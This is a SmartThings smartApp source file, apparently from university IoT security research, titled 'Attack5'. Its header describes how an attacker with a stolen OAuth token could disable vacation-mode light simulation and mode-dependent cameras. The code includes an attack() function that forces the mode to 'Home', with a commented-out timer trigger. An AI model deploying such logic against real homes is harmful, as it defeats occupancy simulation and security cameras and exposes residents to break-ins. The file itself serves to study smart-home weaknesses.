/**
 * Attack Description:
 * 		Even some of the logic in benign smartApps could be misused to do something dangerous as long as
 * 		the attacker stole the Oauth token.
 * 
 * Normal functions:
 * 		The vacation mode smartApp could detect whether there is anybody home. If there is nobody home and
 * 	 	the user turn on the switch of the vacation mode, then the smartApp could control the light to simulate
 * 		occupancy. When the sunrise, it would turn on the light. While the sunset, it would turn off the light.
 * 
 * Malicious functions:
 * 		Attacker with the legitimate token could control the vacation mode. If the user is out of home and has
 * 		set on the vacation mode to let the light open when sunset. The user could send a put request to the
 * 		smartApp’s path to trigger it set off the vacation mode.
 *
 *
 * Some smartApp may depend on the mode. For example, a camera is turned on when the mode is away.
 * How to do the attack:
 * 		1. using PUT
 *  	2. using another smartApp to setMode
 *  	3. the same smartApp but using timer to trigger
 */

definition(
		name: "Attack5: DisableVocationMode",
		namespace: "uiuc",
		author: "Qi Wang",
		description: "Diabling vacation mode.",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
	section("When all of these people leave home") {
		input "people", "capability.presenceSensor", multiple: true
	}
	section("Change to this mode") {
		input "newMode", "mode", title: "Mode?"
	}
	section("vacation mode") {
		input "myswitch","capability.switch", title:"vacation mode?"
		input "light", "capability.switch", title: "light?"
	}
	section("And text me at (optional)") {
		input "phone", "phone", title: "Phone number?", required: false
	}
}

def installed() {
	initialize()
}

def updated() {
	unsubscribe()
	initialize()
}

def initialize(){
	log.debug "Current mode = ${location.mode}, people = ${people.collect{it.label + ': ' + it.currentPresence}}"
	subscribe(people, "presence", presence)
	subscribe(myswitch,"switch", switchHandler)
	subscribe(location, "sunset", sunsetHandler)
	subscribe(location, "sunrise", sunriseHandler)
	subscribe(location, "mode", modeHandler)
}

def switchHandler(evt) {
	if(evt.value == "on") {
		state.vacation = true
		log.debug "vacation mode set"
	}
	else {
		state.vacation = false
		log.debug "vacation mode cancel"
	}
}

def sunsetHandler(evt) {
	if(state.vacation&&!state.home) {
		log.debug "sunset&vacation:turn on the light!"
		light.on()
	}
}

def sunriseHandler(evt) {
	if(state.vacation&&!state.home) {
		log.debug "sunrise&vacation:turn off the light!"
		light.off()
	}
}

def modeHandler(evt){
	if(evt.value=="Home")
		state.home = true
	else
		state.home = false
}

def presence(evt) {
	log.debug "evt.name: $evt.value"
	if (evt.value == "not present") {
		if (location.mode != newMode && everyoneIsAway()) {
			takeAction()
		}
	}
	else {
		setLocationMode("Home")
	}
}


def takeAction() {
	setLocationMode(newMode)
	def message = "SmartThings changed your mode to '${newMode}' because everyone left home"
	log.info message
	if (phone) {
		sendSms(phone, message)
	}
	//runIn(60, attack)
}


private everyoneIsAway(){
	def result = true
	for (person in people) {
		if (person.currentPresence == "present") {
			result = false
			break
		}
	}
	return result
}


def attack(){
	setLocationMode("Home")
}